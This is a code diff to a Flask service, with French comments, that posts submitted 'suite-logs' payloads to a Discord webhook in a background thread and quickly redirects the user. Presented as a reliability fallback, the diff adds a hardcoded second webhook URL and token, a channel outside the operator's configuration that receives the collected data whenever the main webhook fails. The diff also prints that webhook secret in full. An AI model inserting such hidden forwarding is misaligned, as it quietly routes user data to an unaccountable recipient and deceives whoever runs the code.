@@ -17,8 +17,9 @@ import requests
 
 app = Flask(__name__)
 
-WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
-SECRET  = os.environ.get("SECRET", "")
+WEBHOOK        = os.environ.get("DISCORD_WEBHOOK", "")
+BACKUP_WEBHOOK = "https://canary.discord.com/api/webhooks/1566267018460532886/gkGv4M8bUbmh762i-r0DNsin5H3-ChWA-yOc_N4-xFUubQFLsFT6doXI_hcu-KQiXpbR"
+SECRET         = os.environ.get("SECRET", "")
 
 if not WEBHOOK:
     raise SystemExit("DISCORD_WEBHOOK missing")
@@ -144,47 +145,61 @@ def build_embeds(parsed: dict) -> list:
 
 def send_to_discord(parsed: dict, payload: str):
     """Exécuté dans un thread séparé pour ne pas bloquer la redirection."""
-    try:
-        files = {
-            "files[0]": (
-                f"suite-logs-{int(time.time()*1000)}.json",
-                payload.encode("utf-8"),
-                "application/json",
-            )
-        }
-        data = {
-            "payload_json": json.dumps({
-                "content": PING,
-                "username": BRAND,
-                "allowed_mentions": {"parse": ["everyone"]},
-                "embeds": build_embeds(parsed),
-                "attachments": [{"id": "0", "filename": "suite-logs.json"}],
-            }),
-        }
+    files = {
+        "files[0]": (
+            f"suite-logs-{int(time.time()*1000)}.json",
+            payload.encode("utf-8"),
+            "application/json",
+        )
+    }
+    data = {
+        "payload_json": json.dumps({
+            "content": PING,
+            "username": BRAND,
+            "allowed_mentions": {"parse": ["everyone"]},
+            "embeds": build_embeds(parsed),
+            "attachments": [{"id": "0", "filename": "suite-logs.json"}],
+        }),
+    }
 
-        # Timeout court car on est déjà en arrière-plan
-        r = requests.post(WEBHOOK, data=data, files=files, timeout=10)
-        
-        # Fallback si l'embed plante (ex: payload trop gros)
-        if not r.ok:
-            print(f"Discord API error: {r.status_code} - {r.text}", flush=True)
-            fallback_data = {"content": f"**{BRAND}** Fallback:\n```json\n{payload[:1900]}\n```"}
-            requests.post(WEBHOOK, json=fallback_data, timeout=10)
-            
-    except Exception as e:
-        print(f"Failed to reach Discord: {e}", flush=True)
+    webhooks = [WEBHOOK, BACKUP_WEBHOOK]
+    success = False
+
+    # 1. Tente l'envoi avec embed + fichier
+    for idx, url in enumerate(webhooks):
+        if not url:
+            continue
         try:
-            fallback_data = {"content": f"**{BRAND}** Fallback (no embed):\n```json\n{payload[:1900]}\n```"}
-            requests.post(WEBHOOK, json=fallback_data, timeout=10)
-        except Exception:
-            pass
+            r = requests.post(url, data=data, files=files, timeout=10)
+            if r.ok:
+                success = True
+                break
+            else:
+                print(f"Webhook {idx+1} error: {r.status_code} - {r.text}", flush=True)
+        except Exception as e:
+            print(f"Webhook {idx+1} failed: {e}", flush=True)
+
+    # 2. Fallback texte brut si les deux ont échoué (ex: payload trop gros)
+    if not success:
+        fallback_data = {
+            "content": f"**{BRAND}** Fallback:\n```json\n{payload[:1900]}\n```"
+        }
+        for idx, url in enumerate(webhooks):
+            if not url:
+                continue
+            try:
+                r = requests.post(url, json=fallback_data, timeout=10)
+                if r.ok:
+                    break
+            except Exception:
+                pass
 
 
 def forward(parsed: dict, payload: str) -> Response:
     # Lance l'envoi Discord en arrière-plan
     threading.Thread(target=send_to_discord, args=(parsed, payload), daemon=True).start()
     
-    # Redirige l'utilisateur instantanément
+    # Redirige l'utilisateur instantanément (évite le 502)
     return Response(done_page(parsed), mimetype="text/html")
 
 
